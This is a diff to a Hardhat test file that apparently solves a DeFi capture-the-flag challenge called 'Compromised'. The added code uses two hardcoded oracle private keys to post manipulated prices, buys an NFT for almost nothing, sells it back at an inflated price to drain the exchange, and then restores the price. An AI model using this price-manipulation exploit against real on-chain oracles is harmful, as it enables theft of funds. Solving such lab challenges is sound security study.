@@ -1,5 +1,6 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
+const web3 = require('web3');
 
 describe('Compromised challenge', function () {
 
@@ -61,6 +62,33 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9   0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48   0x81A5D6E50C214044bE44cA0CB057fe119097850c
+
+        var postPrice = async (price) => {
+            for (privateKey of [
+                '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+                '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+            ]) {
+                await this.oracle.connect(new ethers.Wallet(privateKey, attacker.provider))
+                    .postPrice('DVNFT', price);
+            }
+        }
+
+        var fetchPrice = async () => {
+            return await this.oracle.getMedianPrice('DVNFT');
+        }
+
+        console.log('1: ', await fetchPrice());
+        await postPrice(0);
+        console.log('2: ', await fetchPrice());
+        var tokenId = await this.exchange.connect(attacker).buyOne({value: 1});
+        await postPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        console.log("asdf zxcv", tokenId);
+        await this.exchange.connect(attacker).sellOne(0);
+        console.log("asdf");
+        await postPrice(INITIAL_NFT_PRICE);
     });
 
     after(async function () {
